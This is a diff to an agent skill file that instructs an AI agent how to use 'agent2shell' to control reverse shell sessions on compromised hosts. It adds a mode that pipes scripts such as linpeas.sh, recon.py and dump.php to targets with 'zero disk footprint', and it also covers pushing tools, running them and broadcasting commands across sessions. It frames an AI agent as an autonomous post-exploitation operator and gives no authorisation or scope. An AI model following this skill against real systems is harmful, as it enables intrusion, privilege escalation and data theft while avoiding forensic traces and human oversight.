@@ -1,21 +1,25 @@
 ---
 name: agent2shell-reverse-shell-agent
 description: >
-  Teaches an AI agent how to use agent2shell to interact with reverse shell
-  sessions. Covers executing commands on compromised targets, uploading and
-  downloading files, querying session metadata, running commands across
-  multiple sessions, and handling long-running commands with streaming output.
-  Copy this skill to your agent's instruction directory to enable autonomous
-  reverse shell interaction via agent2shell.
+  Use when an AI agent needs to execute commands on reverse shell targets via
+  agent2shell, upload or download files to/from compromised hosts, check
+  session status, broadcast commands across multiple sessions, or pipe scripts
+  via stdin without disk footprint. Triggers on: "run a command on the target",
+  "upload to the target", "download from the target", "check active sessions",
+  "agent2shell", "reverse shell", "push/pull files", "pipe script via stdin".
 ---
 
 # agent2shell — AI Agent Skill
 
-Copy this file to your AI agent's instruction directory (e.g., `.claude/` for Claude Code) to enable autonomous interaction with reverse shell sessions via agent2shell.
+agent2shell catches reverse shell connections over TCP and exposes them as structured JSON APIs via Unix domain sockets. You interact with the target by running `agent2shell` commands.
 
-## What is agent2shell
+## When to Use
 
-agent2shell catches reverse shell connections over TCP and exposes them as structured JSON APIs via Unix domain sockets. You interact with the target system by executing `agent2shell` commands — not by typing into a terminal.
+- Execute commands on a compromised target (`agent2shell run`)
+- Upload or download files to/from the target (`push`/`pull`)
+- Pipe local scripts to the target without writing to disk (`run --stdin`)
+- Check session metadata or list active sessions (`status`/`list`)
+- Broadcast commands across multiple sessions (`broadcast`)
 
 ## Prerequisites
 
@@ -51,6 +55,25 @@ Flags in the remote command work without `--` separator:
 agent2shell run ls -la /root    # works — -la is part of the remote command
 agent2shell run -t 10 whoami    # -t is agent2shell's timeout flag
 ```
+
+### Pipe a local script via stdin
+
+```bash
+agent2shell run --stdin <local-file> [interpreter]
+```
+
+Pipes a local file's content as stdin to the remote shell without writing to disk on the target. When no interpreter is specified, defaults to `bash`. Works with any interpreter available on the target:
+
+```bash
+agent2shell run --stdin ./linpeas.sh                      # pipe to bash (default)
+agent2shell run -t 300 --stdin ./linpeas.sh               # with timeout for long scripts
+agent2shell run --stdin ./recon.py python3                 # pipe to python
+agent2shell run --stdin ./dump.php php                     # pipe to PHP
+agent2shell run --stdin ./enum.pl perl                     # pipe to Perl
+echo 'SELECT user();' | agent2shell run --stdin - mysql    # pipe from OS stdin
+```
+
+Use `--stdin` instead of `push` when you want zero disk footprint on the target — the script runs entirely through the shell's stdin.
 
 ### Get session metadata
 
@@ -124,8 +147,14 @@ agent2shell catch -p 5555 --tag database
 
 ## Workflow Patterns
 
-### Tool Upload and Execution
+### Running Scripts on the Target
 
+Use `--stdin` when you want zero disk footprint (script runs entirely through stdin):
+```bash
+agent2shell run -t 300 --stdin ./linpeas.sh
+```
+
+Use `push` when the script needs to persist on the target (run multiple times, share across sessions):
 ```bash
 agent2shell push ./linpeas.sh /tmp/linpeas.sh
 agent2shell run "chmod +x /tmp/linpeas.sh"
@@ -198,9 +227,8 @@ agent2shell list
 Output is streamed line-by-line by default. Use `-t` (seconds) to increase the timeout beyond the default 30s:
 
 ```bash
-agent2shell push ./linpeas.sh /tmp/linpeas.sh
-agent2shell run "chmod +x /tmp/linpeas.sh"
-agent2shell run -t 300 "/tmp/linpeas.sh"
+agent2shell run -t 300 --stdin ./linpeas.sh               # via stdin (no disk)
+agent2shell run -t 300 "/tmp/linpeas.sh"                   # via push (on disk)
 ```
 
 For network scanning, wrap each connection with `timeout` to avoid hanging on unresponsive hosts:
